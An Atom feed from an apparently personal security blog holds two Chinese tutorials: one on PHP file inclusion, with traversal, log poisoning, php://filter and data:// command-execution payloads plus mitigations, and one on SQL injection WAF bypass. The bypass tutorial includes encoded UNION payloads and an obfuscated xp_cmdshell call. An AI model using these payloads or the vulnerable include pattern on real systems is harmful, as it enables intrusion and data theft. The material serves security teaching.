<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>guolala&#39;s blog</title>
  
  <subtitle>情迷不意乱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-02T09:11:04.433Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>guolala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件包含漏洞详解</title>
    <link href="http://yoursite.com/2018/12/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/12/02/文件包含漏洞详解/</id>
    <published>2018-12-02T08:01:44.000Z</published>
    <updated>2018-12-02T09:11:04.433Z</updated>
    
    <content type="html"><![CDATA[<p>严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。</p><p><strong>常见的导致文件包含（文件读取）的函数如下：</strong></p><p><strong>PHP：</strong></p><p><strong>include()</strong>：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p><p><img src="https://i.imgur.com/aLJdj9E.png" alt=""></p><p><strong>require()</strong>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p><p><img src="https://i.imgur.com/tvkgeYA.png" alt=""></p><p><code>require_once()</code> 和 <code>include_once()</code> 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 <code>require_once()</code> 和<code>include_once()</code> 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p><blockquote><p><strong>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</strong></p></blockquote><p>接下来的测试会用下面这个非常简单的代码进行：</p><pre><code>&lt;?php    $file = $_GET[&apos;file&apos;];    include $file;?&gt;</code></pre><p>同目录下有一个phpinfo.txt文件（内容为&lt;?php phpinfo();?&gt;）</p><p><img src="https://i.imgur.com/25CI6aq.png" alt=""></p><h3 id="文件包含有两种："><a href="#文件包含有两种：" class="headerlink" title="文件包含有两种："></a>文件包含有两种：</h3><p>本地文件包含、远程文件包含 （即加载远程文件，在php.ini中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。）</p><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞。</p><ul><li>具有相关的文件包含函数。</li><li>文件包含函数中存在动态变量，比如 include $file;。</li><li>攻击者能够控制该变量，比如$file = $_GET[‘file’];。</li></ul><h2 id="php的文件包含利用"><a href="#php的文件包含利用" class="headerlink" title="php的文件包含利用"></a>php的文件包含利用</h2><p><strong>在php.ini中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。</strong></p><h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>访问：<code>http://www.test.com/index.php?test=/etc/passwd</code>,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。</p><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><ol><li><code>allow_url_fopen</code> = On</li><li><code>allow_url_include</code> = On</li></ol><p>在远程文件<a href="http://10.60.17.60里写入测试代码。" target="_blank" rel="noopener">http://10.60.17.60里写入测试代码。</a></p><pre><code>&lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt;</code></pre><p>  访问<code>http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php</code>。将会在网站根目录下生成text.php文件，内容就是：”<code>&lt;?php phpinfo(); ?&gt;</code>“</p><p><img src="https://i.imgur.com/wgq7QtT.png" alt=""></p><h3 id="图片上传并包含图片shell"><a href="#图片上传并包含图片shell" class="headerlink" title="图片上传并包含图片shell"></a>图片上传并包含图片shell</h3><p>利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。</p><h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p><strong>利用条件：</strong>需要知道ssh-log的位置，且可读。默认情况下为 <code>/var/log/auth.log</code></p><pre><code>ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?</code></pre><blockquote><p>‘@remotehost`</p></blockquote><p>之后会提示输入密码等等，随便输入。</p><p>然后在remotehost的ssh-log中即可写入php代码：</p><p><img src="https://i.imgur.com/CSUgdBp.png" alt=""></p><p>之后进行文件包含即可。</p><h3 id="包含日志文件GetShell"><a href="#包含日志文件GetShell" class="headerlink" title="包含日志文件GetShell"></a>包含日志文件GetShell</h3><p><strong>利用条件：</strong>需要知道服务器日志的存储路径，且日志文件可读。</p><p>既然存在文件包含漏洞就可以利用漏洞读取apache的配置文件找到日志文件的位置。（默认：包含日志文件GetShell）</p><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 <code>/var/log/apache2/</code>。</p><p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改.</p><p><img src="https://i.imgur.com/TP2yw0G.png" alt=""></p><p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。</p><p><img src="https://i.imgur.com/HCmTOhJ.png" alt=""></p><p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p><h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.2.8</p><p>目录字符串，在linux下<strong>4096字节</strong>时会达到最大值，在window下是<strong>256字节</strong>。只要不断的重复<code>./</code></p><pre><code>index.php?file=././././省略././shell.txt</code></pre><h3 id="0字节截断包含"><a href="#0字节截断包含" class="headerlink" title="0字节截断包含"></a>0字节截断包含</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.3.4</p><p>测试代码：</p><pre><code>&lt;?php    $file = $_GET[&apos;file&apos;];    include $file.&apos;/tasdas/asd.php&apos;;?&gt;http://127.0.0.1/123.php?file=phpinfo.txt%00</code></pre><p><img src="https://i.imgur.com/MkYTX3b.png" alt=""></p><blockquote><p>正常上传图片一句话并访问：<a href="http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中`magic_quotes_qpc=off`并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。" target="_blank" rel="noopener">http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中`magic_quotes_qpc=off`并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。</a></p></blockquote><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>PHP伪协议其实就是PHP支持的协议和封装的协议，</p><ul><li>file: — 访问本地文件系统</li><li>http: — 访问 HTTP(s) 网址</li><li>ftp: — 访问 FTP(s) URLs</li><li>php: — 访问各个输入/输出流（I/O streams）【php://stdin 是只读的， php://stdout 和 php://stderr 是只写的】</li><li>zlib: — 压缩流</li><li>data: — 数据（RFC 2397）</li><li>glob: — 查找匹配的文件路径模式</li><li>phar: — PHP 归档</li><li>ssh2: — Secure Shell 2</li><li>rar: — RAR</li><li>ogg: — 音频流</li><li>expect: — 处理交互式的流</li></ul><p>有两个比较重要的配置在php.ini中，<code>allow_url_fopen</code> 和<code>allow_url_include</code>会影响到fopen和include等等函数对于伪协议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p><h4 id="File"><a href="#File" class="headerlink" title="File://"></a>File://</h4><p>用于访问文件系统。（可用于任意文件执行），在<code>allow_url_fopen</code> 和<code>allow_url_include</code>任何状态下都可以用。</p><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><ul><li>php版本大于等于php5.2</li><li><code>allow_url_fopen</code> = On</li><li><p><code>allow_url_include</code> = On</p><p>  <a href="http://127.0.0.1/123.php?file=data:text/plain" target="_blank" rel="noopener">http://127.0.0.1/123.php?file=data:text/plain</a>,&lt;?php phpinfo();?&gt;</p></li></ul><p>任意命令执行</p><pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</code></pre><p>利用base64编码绕过</p><pre><code>http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><blockquote><p>加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p></blockquote><p><img src="https://i.imgur.com/en29m6p.png" alt=""></p><p><img src="https://i.imgur.com/DNV6gBY.png" alt=""></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>php版本大于等于php5.3.0</p><p>在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。</p><p>使用绝对路径：</p><pre><code>http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://i.imgur.com/is1PJIk.png" alt=""></p><p>或者使用相对路径：</p><pre><code>http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://i.imgur.com/w5hVkH8.png" alt=""></p><h4 id="zip-–-zlib-–bzip2-–zip"><a href="#zip-–-zlib-–bzip2-–zip" class="headerlink" title="zip:// – zlib:// –bzip2:// –zip://"></a>zip:// – zlib:// –bzip2:// –zip://</h4><p>php版本大于等于php5.3.0</p><p>构造zip包的方法同phar</p><p>但是使用zip协议，需要指定<strong>绝对路径</strong>，同时将#编码为%23，之后填上压缩包内的文件。</p><pre><code>http://127.0.0.1/123.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txthttp://127.0.0.1/123.php?file=zip://phpinfo.zip%23phpinfo.txthttp://127.0.0.1/123.php?file=zip://./phpinfo.zip%23phpinfo.txt</code></pre><p><img src="https://i.imgur.com/zfzbat0.png" alt=""></p><p><strong>压缩流：</strong>在<code>allow_url_fopen</code> 和<code>allow_url_include</code>任何状态下都可以用。</p><p>使用方法：</p><pre><code>http://127.0.0.1/test/1.php?f=zip://./1.zip%231.txthttp://127.0.0.1/test/1.php?f=zip:///Applications/MAMP/htdos/test/1.zip%231.txthttp://127.0.0.1/test/1.php?f=file=compress.bzip2:///Applications/MAMP/htdos/test/file.jpghttp://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg</code></pre><h5 id="另一种思路："><a href="#另一种思路：" class="headerlink" title="另一种思路："></a>另一种思路：</h5><p>将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩，压缩文件 名为file.zip，如果可以上传zip文件便直接上传，如果不能则将file.zip重命名为file.jpg后上传，其他几种压缩格式也可以这样操作。</p><h4 id="PHP-input"><a href="#PHP-input" class="headerlink" title="PHP://input"></a>PHP://input</h4><p><code>allow_url_include = On。</code></p><p>对<code>allow_url_fopen</code>不做要求。</p><p><img src="https://i.imgur.com/LWAR7Gk.png" alt=""></p><p>可以访问请求的原始数据，简单来说POST请求下，php://input可以获取到post数据，如果<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p><h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>对<code>allow_url_include</code> 和<code>allow_url_fopen</code>不做要求。</p><p>在任意文件读取或者getshell会用到这个伪协议。</p><pre><code>http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php</code></pre><p><img src="https://i.imgur.com/5uTt3Qz.png" alt=""></p><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p><img src="https://i.imgur.com/6I762D1.png" alt=""></p><pre><code>http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php</code></pre><p>效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。</p><p><img src="https://i.imgur.com/TO2gT9d.png" alt=""></p><p>php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。</p><p>在include函数使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p><p><strong>php://filter 目标使用以下的参数作为它路径的一部分:</strong></p><ul><li>resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。 </li><li>read=&lt;读链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li><li>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li></ul><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。</p><pre><code>http://127.0.0.1/123.php?file=../phpinfo.txt</code></pre><p><img src="https://i.imgur.com/DFzB7L3.png" alt=""></p><blockquote><p>实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt</p></blockquote><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>服务器端常常会对于 <strong>../</strong> 等做一些过滤，可以用一些编码来进行绕过。</p><p><strong>利用url编码</strong></p><p><strong>../：</strong></p><ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e/</li></ul><p><strong>..\：</strong></p><ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul><p><strong>二次编码</strong></p><p><strong>../：</strong></p><ul><li>%252e%252e%252f</li></ul><p><strong>..\：</strong></p><ul><li>%252e%252e%255c</li></ul><p><strong>容器/服务器的编码方式</strong></p><p><strong>../：</strong></p><ul><li>..%c0%af</li><li>%c0%ae%c0%ae/（java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点））</li></ul><p><strong>..\：</strong></p><ul><li>..%c1%9c</li></ul><h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p>测试代码：</p><pre><code>&lt;?php    $file = $_GET[&apos;file&apos;];    include $file.&apos;/test/test.php&apos;;?&gt;</code></pre><p>构造压缩包结构如下：</p><p><img src="https://i.imgur.com/Tpznihz.png" alt=""></p><pre><code>http://127.0.0.1/1.php?file=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23testhttp://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip</code></pre><p><img src="https://i.imgur.com/fwBEvdb.png" alt=""></p><blockquote><p>利用zip协议，注意要指定绝对路径</p></blockquote><p><strong>则拼接后为：zip://C:\phpStudy\PHPTutorial\WWW\test%23test/test/test.php</strong></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>$$导致的变量覆盖，举个例子</p><p>$key = ‘hello’</p><p>$hello = ‘world’</p><p>echo $$key</p><p>输出world</p><h2 id="文件包含修复方案"><a href="#文件包含修复方案" class="headerlink" title="文件包含修复方案"></a>文件包含修复方案</h2><ul><li>禁止远程文件包含： <code>allow_url_include=off</code></li><li>配置 <code>open_basedir=</code>指定目录，限制访问区域。</li><li>过滤<strong>../</strong>等特殊符号</li><li>修改Apache日志文件的存放地址</li><li>开启魔术引号 <code>magic_quotes_qpc=on</code></li><li>尽量不要使用动态变量调用文件，直接写要包含的文件</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见的导致文件包含（文件读取）的函数如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PHP：&lt;/strong&gt;&lt;/p&gt;
&lt;p
      
    
    </summary>
    
      <category term="文件包含" scheme="http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL的WAF绕过</title>
    <link href="http://yoursite.com/2018/12/02/SQL%E7%9A%84WAF%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2018/12/02/SQL的WAF绕过/</id>
    <published>2018-12-02T07:16:47.000Z</published>
    <updated>2018-12-02T09:07:33.918Z</updated>
    
    <content type="html"><![CDATA[<p>WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。</p><h2 id="WAF的功能"><a href="#WAF的功能" class="headerlink" title="WAF的功能"></a>WAF的功能</h2><ul><li>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</li><li>访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</li><li>架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</li><li>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</li></ul><h2 id="WAF常见特点"><a href="#WAF常见特点" class="headerlink" title="WAF常见特点"></a>WAF常见特点</h2><ul><li>异常检测协议：拒绝不符合HTTP标准的请求</li><li>增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</li><li>白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题</li><li>基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</li><li>状态管理：重点进行会话保护</li><li>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</li></ul><h2 id="WAF识别扫描器"><a href="#WAF识别扫描器" class="headerlink" title="WAF识别扫描器"></a>WAF识别扫描器</h2><ul><li>1) 扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识</li><li>2)  单IP+ cookie某时间段内触发规则次数</li><li>3)  隐藏的链接标签等(<code>&lt;a&gt;</code>)</li><li>4） Cookie植入</li><li>5)  验证码验证，扫描器无法自动填充验证码</li><li>6)  单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏</li></ul><h2 id="WAF绕过思路"><a href="#WAF绕过思路" class="headerlink" title="WAF绕过思路"></a>WAF绕过思路</h2><p>根据WAF部署位置，针对WAF、WEB服务器、WEB应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法解析的差异，绕过WAF，将payload送至服务器执行。</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union，那就使用Union、UnIoN等等绕过。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union，那么我们就用<strong>%55</strong>也就是<strong>U</strong>的<strong>16进制</strong>编码来代替U，union写成 <strong>%55nION</strong>，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。</p><blockquote><p>也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。</p></blockquote><p>####（1）URL编码：</p><p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为<strong>%20</strong>、单引号<strong>%27</strong>、左括号<strong>%28</strong>、右括号<strong>%29</strong>，/为<strong>%25</strong>。</p><p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：</p><pre><code>?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT</code></pre><p>####（2）十六进制编码：</p><pre><code>/index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></pre><blockquote><p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p></blockquote><p>####（3）Unicode编码：</p><p>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p><p>常用的几个符号的一些Unicode编码：</p><ul><li>单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</li><li>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</li><li>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</li><li>右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9</li></ul><pre><code>?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1</code></pre><blockquote><p>一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用</p></blockquote><blockquote><p>二：示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p></blockquote><blockquote><p>三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过</p></blockquote><h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。</p><pre><code>index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</code></pre><blockquote><p>建议不要对此抱有太大希望….</p></blockquote><h3 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h3><p>常见的注释符：</p><pre><code>//-- /**/# --+--  -;--a</code></pre><h4 id="（1）普通注释"><a href="#（1）普通注释" class="headerlink" title="（1）普通注释"></a>（1）普通注释</h4><pre><code>index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users#</code></pre><blockquote><p><code>/**/</code>在构造得查询语句中插入注释，规避对<strong>空格</strong>的依赖或关键字识别;  #、–+用于终结语句的查询</p></blockquote><h4 id="（2）内联注释"><a href="#（2）内联注释" class="headerlink" title="（2）内联注释"></a>（2）内联注释</h4><p>相比普通注释，内联注释用的更多，它有一个特性<code>/*! */</code>只有<strong>MySQL</strong>能识别(<code>/*! */</code>表示注释里面的语句会被执行)</p><pre><code>实例一：?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3实例二：?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</code></pre><blockquote><p>两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点当然前提是包括<code>/</code>、<code>*</code>在内的这些字符能正常使用</p></blockquote><h3 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h3><p>有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p><p>####（1）函数或变量</p><ul><li>hex()、bin() ==&gt; ascii()</li><li>sleep() ==&gt;benchmark()</li><li>concat_ws()==&gt;group_concat()</li><li>mid()、substr() ==&gt; substring()</li><li>@@user ==&gt; user()</li><li>@@datadir ==&gt; datadir()</li></ul><p>比如substr()被过滤了可以用mid()和left()、right()等函数。</p><pre><code>substr((select &apos;password&apos;),1,1) = 0x70strcmp(left(&apos;password&apos;,1), 0x69) = 1strcmp(left(&apos;password&apos;,1), 0x70) = 0strcmp(left(&apos;password&apos;,1), 0x71) = -1</code></pre><p>####（2）符号</p><p><code>and</code>和<code>or</code>有可能不能使用，或者可以试下<code>&amp;&amp;</code>和<code>||</code>能不能用；还有<code>=</code>不能使用的情况，可以考虑尝试<code>&lt;</code>、<code>&gt;</code>，因为如果不小于又不大于，那边是等于了。<br>在看一下用得多的空格，可以使用如下符号表示其作用：<code>%20</code>、<code>%09</code>、<code>%0a</code>、<code>%0b</code>、<code>%0c</code>、<code>%0d</code>、<code>/**/</code></p><p>####（3）生僻函数</p><p><strong>MySQL/PostgreSQL</strong>支持<strong>XML</strong>函数：</p><pre><code>Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’);?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))　　SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));　//postgresql?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</code></pre><blockquote><p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。　</p></blockquote><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>乌云drops上“waf的绕过技巧”一文使用的几个例子：</p><ol><li>使用反引号<strong>`</strong>，例如<strong>select `version()`</strong>，可以用来绕过<strong>空格</strong>和<strong>正则</strong>，特殊情况下还可以将其做<strong>注释符</strong>用</li><li>神奇的<code>-+.</code>，<code>select+id-1+1.from users;</code>   <code>+</code>是用于字符串连接的，<code>-</code>和<code>.</code>在此也用于连接，可以逃过<strong>空格</strong>和<strong>关键字</strong>过滤</li><li><code>@</code>符号，<code>select@^1.from users; `</code>@<code>用于变量定义如</code>@var_name<code>，一个</code>@<code>表示用户定义，</code>@@`表示系统变量</li><li><code>select-count(id)test from users;</code>  //绕过空格限制</li></ol><p>部分可能发挥大作用的字符(前文中没怎么说到的):</p><pre><code>`~!@%()[].-+|%00</code></pre><p>关键字拆分：</p><pre><code>‘se’+’lec’+’t’%S%E%L%E%C%T 1?id=1;EXEC(‘ma’+&apos;ster..x’+&apos;p_cm’+&apos;dsh’+&apos;ell ”net user”’)</code></pre><p>!和()：</p><pre><code>&apos; or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT)</code></pre><blockquote><p>使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p></blockquote><h3 id="HTTP参数控制"><a href="#HTTP参数控制" class="headerlink" title="HTTP参数控制"></a>HTTP参数控制</h3><p>这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><h4 id="HPP-HTTP-Parameter-Polution-（重复参数污染）"><a href="#HPP-HTTP-Parameter-Polution-（重复参数污染）" class="headerlink" title="HPP(HTTP Parameter Polution)（重复参数污染）"></a>HPP(HTTP Parameter Polution)（重复参数污染）</h4><pre><code>/?id=1;select+1,2,3+from+users+where+id=1—/?id=1;select+1&amp;id=2,3+from+users+where+id=1—/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</code></pre><blockquote><p>HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式。</p></blockquote><blockquote><p>具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过</p></blockquote><h4 id="HPF-HTTP-Parameter-Fragment-（HTTP分割注入）"><a href="#HPF-HTTP-Parameter-Fragment-（HTTP分割注入）" class="headerlink" title="HPF(HTTP Parameter Fragment)（HTTP分割注入）"></a>HPF(HTTP Parameter Fragment)（HTTP分割注入）</h4><p>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p><pre><code>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</code></pre><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过。</p><p><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</code></p><blockquote><p>示例<code>0xA*1000指0xA</code>后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p></blockquote><h3 id="一些整合绕过的例子："><a href="#一些整合绕过的例子：" class="headerlink" title="一些整合绕过的例子："></a>一些整合绕过的例子：</h3><pre><code>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*!information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– 